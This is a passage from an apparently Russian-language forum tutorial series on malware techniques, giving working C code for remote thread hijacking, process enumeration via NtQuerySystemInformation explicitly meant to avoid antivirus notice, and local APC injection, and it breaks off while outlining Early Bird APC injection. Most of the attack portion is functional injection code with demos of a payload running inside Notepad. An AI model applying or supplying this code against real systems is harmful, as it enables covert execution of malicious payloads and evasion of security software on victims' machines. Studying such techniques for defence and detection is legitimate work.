<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteThreadhandle(IN DWORD dwProcessId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

    HANDLE         hSnapShot  = NULL;
    THREADENTRY32  Thr        = {
        .dwSize = sizeof(THREADENTRY32)
    };

    // Получение снимка потоков текущего выполняемого процесса
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf(&quot;\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    // Получение информации о первом потоке, найденном в снимке.
    if (!Thread32First(hSnapShot, &amp;Thr)) {
        printf(&quot;\n\t[!] Thread32First Failed With Error : %d \n&quot;, GetLastError());
        goto _EndOfFunction;
    }

    do {
        // Если PID потока равен PID целевого процесса, то
        // этот поток работает внутри целевого процесса
        if (Thr.th32OwnerProcessID == dwProcessId){

            *dwThreadId  = Thr.th32ThreadID;
            *hThread     = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

            if (*hThread == NULL)
                printf(&quot;\n\t[!] OpenThread Failed With Error : %d \n&quot;, GetLastError());

            break;
        }

    // Пока в снимке остаются потоки
    } while (Thread32Next(hSnapShot, &amp;Thr));


_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwThreadId == NULL || *hThread == NULL)
        return FALSE;
    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция Перехвата удаленных потоков</b><br />
<br />
Эта часть аналогична функции перехвата, рассмотренной в предыдущих модулях. Получите дескриптор удаленного процесса, внедрите полезную нагрузку в удаленный процесс, а затем выполните захват потока.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_ALL
    };

    // Приостановите поток
    SuspendThread(hThread);

    if (!GetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] GetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    ThreadCtx.Rip = pAddress;

    if (!SetThreadContext(hThread, &amp;ThreadCtx)) {
        printf(&quot;\t[!] SetThreadContext Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    printf(&quot;\t[#] Нажмите &lt;Enter&gt; для выполнения ... &quot;);
    getchar();

    ResumeThread(hThread);

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация</b><br />
<br />
Получение PID целевого процесса. В данном случае целевым процессом является Notepad.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781176194.png"
		data-src="https://osint42.org/attachments/1746781176194-png.129/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781176194-png.129/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781176194.png"
			title="1746781176194.png"
			width="1418" height="803" loading="lazy" />
	</div><br />
<br />
Внедрение полезной нагрузки и захватит идентификатор потока 7136. Стек потока показывает, что адрес полезной нагрузки — это следующая задача для выполнения.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781182416.png"
		data-src="https://osint42.org/attachments/1746781182416-png.130/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781182416-png.130/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781182416.png"
			title="1746781182416.png"
			width="1718" height="717" loading="lazy" />
	</div><br />
<br />
В итоге, полезная нагрузка выполнена.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781190598.png"
		data-src="https://osint42.org/attachments/1746781190598-png.131/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781190598-png.131/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781190598.png"
			title="1746781190598.png"
			width="1113" height="728" loading="lazy" />
	</div></div>
						

							<h2>Определение PID нужного процесса, или перечисления процессов</h2>

							

							

							<div class="bbWrapper">Тема перечисления процессов затрагивалась здесь:Иньекция в процесс | Цикл статей &quot;Изучение вредоносных программ&quot;<br />
<br />
Также Изучаем технику Thread Hijacking | Цикл статей &quot;Изучение вредоносных программ для проведения атаки Thread Hijacking в удаленный процесс необходимо получить ID целевого процесса.<br />
<br />
Давайте попробуем это сделать, что-бы не привлекать внимание антивирусов.)<br />
<br />
Предлагаю использовать функцию NtQuerySystemInformation.<br />
NtQuerySystemInformation экспортируется из модуля ntdll.dll, поэтому для его использования потребуется GetModuleHandle и GetProcAddress.<br />
<br />
Документация Microsoft по NtQuerySystemInformation показывает, что он способен возвращать много информации о системе. Основное внимание этой статьи будет уделено его использованию для перечисления процессов.<br />
<br />
<b>Получение адреса NtQuerySystemInformation </b><br />
<br />
Как было упомянуто ранее, для получения адреса NtQuerySystemInformation из ntdll.dll необходимы GetProcAddress и GetModuleHandle.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Указатель на функцию
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

// Получение адреса NtQuerySystemInformation
pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtQuerySystemInformation&quot;);
if (pNtQuerySystemInformation == NULL) {
    printf(&quot;[!] GetProcAddress завершилась с ошибкой: %d\n&quot;, GetLastError());
    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Параметры NtQuerySystemInformation</b><br />
<br />
Параметры NtQuerySystemInformation показаны ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);</code></pre>
	</div>
</div><br />
SystemInformationClass - Определяет, какой тип системной информации возвращает функция.<br />
<br />
SystemInformation - Указатель на буфер, который получит запрошенную информацию. Возвращенная информация будет в форме структуры, тип которой указан в соответствии с параметром SystemInformationClass.<br />
<br />
SystemInformationLength - Размер буфера, на который указывает параметр SystemInformation, в байтах.<br />
<br />
ReturnLength - Указатель на переменную ULONG, которая получит фактический размер информации, записанной в SystemInformation.<br />
<br />
Поскольку задача заключается в перечислении процессов, будет использован флаг SystemProcessInformation. При использовании этого флага функция вернет массив структур SYSTEM_PROCESS_INFORMATION (через параметр SystemInformation), по одной для каждого процесса, работающего в системе.<br />
<br />
<b>Структура SYSTEM_PROCESS_INFORMATION </b><br />
<br />
Следующим шагом будет изучение документации Microsoft, чтобы понять, как выглядит структура SYSTEM_PROCESS_INFORMATION.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    PVOID Reserved2;
    ULONG HandleCount;
    ULONG SessionId;
    PVOID Reserved3;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG Reserved4;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    PVOID Reserved5;
    SIZE_T QuotaPagedPoolUsage;
    PVOID Reserved6;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved7[6];
} SYSTEM_PROCESS_INFORMATION;</code></pre>
	</div>
</div><br />
Основное внимание будет уделено полям UNICODE_STRING ImageName, которое содержит имя процесса, и UniqueProcessId, <b>которое является идентификатором процесса.</b><br />
Кроме того, поле NextEntryOffset будет использовано для перехода к следующему элементу в возвращаемом массиве.<br />
<br />
Поскольку вызов NtQuerySystemInformation с флагом SystemProcessInformation вернет массив структур SYSTEM_PROCESS_INFORMATION неизвестного размера, NtQuerySystemInformation должен быть вызван дважды. Первый вызов получит размер массива, который будет использован для выделения буфера, а затем второй вызов использует выделенный буфер.<br />
<br />
Ожидается, что первый вызов NtQuerySystemInformation завершится с ошибкой STATUS_INFO_LENGTH_MISMATCH (0xC0000004), так как в нем передаются недействительные параметры, просто для получения размера массива.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>ULONG                        uReturnLen1    = NULL,
                             uReturnLen2    = NULL;
PSYSTEM_PROCESS_INFORMATION  SystemProcInfo = NULL;
NTSTATUS                     STATUS         = NULL;

// Первый вызов NtQuerySystemInformation
// Он завершится ошибкой STATUS_INFO_LENGTH_MISMATCH
// Но он предоставит информацию о том, сколько памяти необходимо выделить (uReturnLen1)
pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

// Выделение достаточного буфера для возвращаемого массива структур `SYSTEM_PROCESS_INFORMATION`
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
if (SystemProcInfo == NULL) {
    printf(&quot;[!] HeapAlloc завершилась с ошибкой: %d\n&quot;, GetLastError());
    return FALSE;
}

// Второй вызов NtQuerySystemInformation
// Вызываем NtQuerySystemInformation с правильными аргументами, результат будет сохранен в &#039;SystemProcInfo&#039;
STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
if (STATUS != 0x0) {
    printf(&quot;[!] NtQuerySystemInformation завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Перечисление Процессов </b><br />
<br />
Теперь, когда массив успешно получен, следующим шагом будет проход по нему что-бы найти нужный ImageName.<br />
Buffer, который содержит имя процесса. <b>На каждой итерации будет производиться сравнение имени процесса с целевым именем процесса.</b><br />
<br />
Чтобы получить доступ к каждому элементу типа SYSTEM_PROCESS_INFORMATION в массиве, необходимо использовать член NextEntryOffset. Чтобы найти адрес следующего элемента, добавьте адрес предыдущего элемента к NextEntryOffset. Это демонстрируется в приведенном ниже фрагменте кода.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// &#039;SystemProcInfo&#039; теперь представляет новый элемент в массиве
SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);</code></pre>
	</div>
</div><br />
<b>Освобождение выделенной памяти</b><br />
<br />
Перед переходом SystemProcInfo к новому элементу в массиве необходимо сохранить начальный адрес выделенной памяти, чтобы освободить его позже. Следовательно, перед началом цикла адрес необходимо сохранить во временной переменной.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Поскольку мы будем изменять &#039;SystemProcInfo&#039;, мы сохраняем его начальное значение перед while-циклом, чтобы освободить его позже
pValueToFree = SystemProcInfo;</code></pre>
	</div>
</div><br />
<b>Недокументированная часть NtQuerySystemInformation</b><br />
<br />
NtQuerySystemInformation остается в значительной степени недокументированным, и большая часть его до сих пор остается неизвестной. Например, обратите внимание на члены Reserved в SYSTEM_PROCESS_INFORMATION.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781536772.png"
		data-src="https://osint42.org/attachments/1746781536772-png.132/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781536772-png.132/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781536772.png"
			title="1746781536772.png"
			width="850" height="532" loading="lazy" />
	</div><br />
<br />
<b>Полный код выполнения перечисления процессов с использованием NtQuerySystemInformation представлен ниже:</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetRemoteProcessHandle(LPCWSTR szProcName, DWORD* pdwPid, HANDLE* phProcess) {

    fnNtQuerySystemInformation   pNtQuerySystemInformation = NULL;
    ULONG                        uReturnLen1               = NULL,
                                 uReturnLen2               = NULL;
    PSYSTEM_PROCESS_INFORMATION  SystemProcInfo            = NULL;
    NTSTATUS                     STATUS                    = NULL;
    PVOID                        pValueToFree              = NULL;

    pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L&quot;NTDLL.DLL&quot;), &quot;NtQuerySystemInformation&quot;);
    if (pNtQuerySystemInformation == NULL) {
        printf(&quot;[!] GetProcAddress завершилась с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &amp;uReturnLen1);

    SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
    if (SystemProcInfo == NULL) {
        printf(&quot;[!] HeapAlloc завершилась с ошибкой: %d\n&quot;, GetLastError());
        return FALSE;
    }

    // Так как мы будем изменять &#039;SystemProcInfo&#039;, мы сохраняем его начальное значение перед циклом while, чтобы освободить его позже
    pValueToFree = SystemProcInfo;

    STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &amp;uReturnLen2);
    if (STATUS != 0x0) {
        printf(&quot;[!] NtQuerySystemInformation завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    while (TRUE) {

        // Проверяем размер имени процесса
        // Сравниваем имя перечисленного процесса с заданным целевым процессом
        if (SystemProcInfo-&gt;ImageName.Length &amp;&amp; wcscmp(SystemProcInfo-&gt;ImageName.Buffer, szProcName) == 0) {

            // Открываем дескриптор целевого процесса, сохраняем его и завершаем выполнение
            *pdwPid        = (DWORD)SystemProcInfo-&gt;UniqueProcessId;
            *phProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo-&gt;UniqueProcessId);
            break;
        }

        // Если NextEntryOffset равен 0, мы достигли конца массива
        if (!SystemProcInfo-&gt;NextEntryOffset)
            break;

        // Переходим к следующему элементу в массиве
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo-&gt;NextEntryOffset);
    }

    // Освобождаем память, используя начальный адрес
    HeapFree(GetProcessHeap(), 0, pValueToFree);

    // Проверяем, удалось ли нам успешно получить дескриптор целевого процесса
    if (*pdwPid == NULL || *phProcess == NULL)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
Этот код использует NtQuerySystemInformation, чтобы перечислить все процессы, работающие в системе, и затем ищет определенный процесс на основе его имени (szProcName). Если такой процесс найден, функция возвращает его идентификатор процесса (pdwPid) и дескриптор (phProcess). Если процесс не найден или произошла какая-либо другая ошибка, функция возвращает FALSE.<br />
<br />
Демонстрация:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746781548462.png"
		data-src="https://osint42.org/attachments/1746781548462-png.133/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746781548462-png.133/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746781548462.png"
			title="1746781548462.png"
			width="1282" height="496" loading="lazy" />
	</div></div>
						

							<h2>Изучаем технику APC Injection</h2>

							

							

							<div class="bbWrapper">Предлагаю в этой статье рассмотреть один способ выполнения полезной нагрузки <b><u>без создания нового потока. Этот метод известен как APC-инъекция.</u><br />
<br />
Что такое APC? Асинхронные вызовы процедур (APC)</b> — это механизм операционной системы Windows, который позволяет программам выполнять задачи асинхронно, продолжая выполнять другие задачи. APC реализованы как процедуры в режиме ядра, выполняемые в контексте определенного потока.<br />
Вредоносное ПО может использовать APC для постановки в очередь полезной нагрузки и последующего ее выполнения по расписанию.<br />
<br />
<b>Состояние готовности</b><br />
<br />
Не все потоки могут выполнить поставленную в очередь функцию APC, это могут сделать только потоки в состоянии готовности. Такой поток находится в режиме ожидания. Когда поток переходит в состояние готовности, он помещается в очередь готовых потоков, что позволяет ему выполнять функции APC из очереди.<br />
<br />
<b>Что такое APC-инъекция? </b><br />
<br />
Для постановки функции APC в очередь потока адрес этой функции должен быть передан в QueueUserAPC WinAPI.<br />
<br />
Согласно документации Microsoft:<br />
<br />
Приложение помещает APC в очередь потока, вызывая функцию QueueUserAPC. Вызывающий поток указывает адрес функции APC в вызове QueueUserAPC.<br />
<br />
Адрес внедренной полезной нагрузки будет передан в QueueUserAPC для ее выполнения. Перед этим поток в локальном процессе должен быть переведен в состояние готовности.<br />
<br />
<b>QueueUserAPC</b><br />
<br />
QueueUserAPC представлена ниже и принимает 3 аргумента:<br />
<br />
pfnAPC - Адрес вызываемой функции APC.<br />
hThread - Дескриптор потока, находящегося в состоянии готовности или приостановленного потока.<br />
dwData - Если функция APC требует параметры, они могут быть переданы здесь. В коде этой статьи это значение будет NULL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD QueueUserAPC(
[in] PAPCFUNC pfnAPC,
[in] HANDLE hThread,
[in] ULONG_PTR dwData
);</code></pre>
	</div>
</div><br />
<b>Перевод потока в состояние готовности</b><br />
<br />
Поток, который будет выполнять поставленную в очередь функцию, должен находиться в состоянии готовности. Это можно сделать, создав поток и используя один из следующих WinAPI:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>Sleep
SleepEx
MsgWaitForMultipleObjects
MsgWaitForMultipleObjectsEx
WaitForSingleObject
WaitForSingleObjectEx
WaitForMultipleObjects
WaitForMultipleObjectsEx
SignalObjectAndWait</code></pre>
	</div>
</div><br />
Эти функции используются для синхронизации потоков и улучшения производительности и отклика приложений, однако в этом случае достаточно передать дескриптор фиктивного события.<br />
Передача корректных параметров этим функциям не требуется, так как простое использование одной из функций достаточно для перевода потока в состояние готовности.<br />
<br />
Для создания фиктивного события будет использоваться WinAPI CreateEvent.<br />
<b>Новый объект события</b> — это объект синхронизации, который позволяет потокам общаться между собой, сигнализируя и ожидая событий. Поскольку результат CreateEvent не имеет значения, любое действующее событие может быть передано ранее показанными WinAPI.<br />
<br />
<b>Использование функций</b><br />
<br />
Ниже приведены примеры использования функций для перевода текущего потока в состояние готовности.<br />
<br />
Используя Sleep:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction1() {
Sleep(-1);
}</code></pre>
	</div>
</div><br />
Используя SleepEx:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction2() {
SleepEx(INFINITE, TRUE);
}</code></pre>
	</div>
</div><br />
Используя WaitForSingleObject:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction3() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent){
 WaitForSingleObject(hEvent, INFINITE);
 CloseHandle(hEvent);
}
}</code></pre>
	</div>
</div><br />
Используя MsgWaitForMultipleObjects:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction4() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent) {
MsgWaitForMultipleObjects(1, &amp;hEvent, TRUE, INFINITE, QS_INPUT);
 CloseHandle(hEvent);
}
}</code></pre>
	</div>
</div><br />
Используя SignalObjectAndWait:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlertableFunction5() {
HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent1 &amp;&amp; hEvent2) {
 SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
 CloseHandle(hEvent1);
 CloseHandle(hEvent2);
}
}</code></pre>
	</div>
</div><br />
<b><u>Потоки созданные в приостановленном состоянии, также могут выполниться.</u></b><br />
Если целевой поток создается в приостановленном состоянии. Если этот метод используется для выполнения полезной нагрузки,<b><u> сначала следует вызвать QueueUserAPC, а затем возобновить приостановленный поток.</u></b> При этом поток должен быть создан в приостановленном состоянии, приостановка существующего потока не сработает.<br />
<br />
Код, представленный в этой статье, демонстрирует APC-инъекцию через поток в состоянии готовности и приостановленный поток.<br />
<br />
<b>Логика реализации APC-инъекции</b><br />
<br />
В качестве итога, логика реализации будет следующей:<br />
<br />
Сначала создайте поток, который выполняет одну из вышеупомянутых функций, чтобы перевести его в состояние готовности. Внедрите полезную нагрузку в память. Дескриптор потока и базовый адрес полезной нагрузки будут переданы в качестве входных параметров в QueueUserAPC.<br />
<br />
<b>Функция APC-инъекции RunViaApcInjection </b>— это функция, которая выполняет APC-инъекцию и требует 3 аргумента:<br />
<br />
hThread - Дескриптор потока, находящегося в состоянии готовности или приостановленного.<br />
pPayload - Указатель на базовый адрес полезной нагрузки.<br />
sPayloadSize - Размер полезной нагрузки.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

PVOID pAddress = NULL;
DWORD dwOldProtection = NULL;

pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (pAddress == NULL) {
    printf(&quot;\t[!] VirtualAlloc не удалось выполнить с ошибкой : %d \n&quot;, GetLastError());
    return FALSE;
}

memcpy(pAddress, pPayload, sPayloadSize);

if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    printf(&quot;\t[!] VirtualProtect не удалось выполнить с ошибкой : %d \n&quot;, GetLastError());
    return FALSE;
}

// Если hThread находится в состоянии готовности, QueueUserAPC непосредственно выполнит полезную нагрузку
// Если hThread находится в приостановленном состоянии, полезная нагрузка не будет выполнена, пока поток не будет возобновлен после этого
if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
    printf(&quot;\t[!] QueueUserAPC не удалось выполнить с ошибкой : %d \n&quot;, GetLastError());
    return FALSE;
}

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Демо - APC-инъекция с использованием потока в состоянии готовности</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782911317.png"
		data-src="https://osint42.org/attachments/1746782911317-png.134/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782911317-png.134/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782911317.png"
			title="1746782911317.png"
			width="1360" height="699" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782918539.png"
		data-src="https://osint42.org/attachments/1746782918539-png.135/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782918539-png.135/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782918539.png"
			title="1746782918539.png"
			width="1013" height="689" loading="lazy" />
	</div><br />
<br />
<b>Демо - APC-инъекция с использованием потока в приостановленном состоянии</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782926397.png"
		data-src="https://osint42.org/attachments/1746782926397-png.136/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782926397-png.136/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782926397.png"
			title="1746782926397.png"
			width="1264" height="608" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746782933674.png"
		data-src="https://osint42.org/attachments/1746782933674-png.137/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746782933674-png.137/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746782933674.png"
			title="1746782933674.png"
			width="1194" height="688" loading="lazy" />
	</div><br />
<br />
<b>APC Injection в удаленном процессе</b><br />
<br />
Теперь предлагаю использовать тот же API для выполнения полезной нагрузки в удаленном процессе. Хотя подход немного отличается, используемый метод остается тем же.<br />
<br />
К этому моменту должно быть хорошо понятно, что инъекция APC требует <b><u>либо приостановленного потока, либо потока в состоянии готовности</u></b> для успешного выполнения полезной нагрузки.<br />
Однако трудно найти потоки в этих состояниях, особенно те, которые работают с обычными правами пользователя.<br />
<br />
Решение состоит в создании приостановленного процесса с использованием WinAPI CreateProcess и использовании дескриптора его приостановленного потока. Приостановленный поток соответствует критериям использования в APC инъекции. Этот метод известен как ранняя инъекция APC (<b>Early Bird APC Injection</b>).<br />
<br />
<b>Логика реализации Early Bird. Логика реализации этой техники будет следующей:</b><br />
<ol>
<li data-xf-list-type="ol">Создать приостановленный процесс, используя флаг CREATE_SUSPENDED.</li>
<li data-xf-list-type="ol">Записать полезную нагрузку в адресное пространство нового целевого процесса.</li>
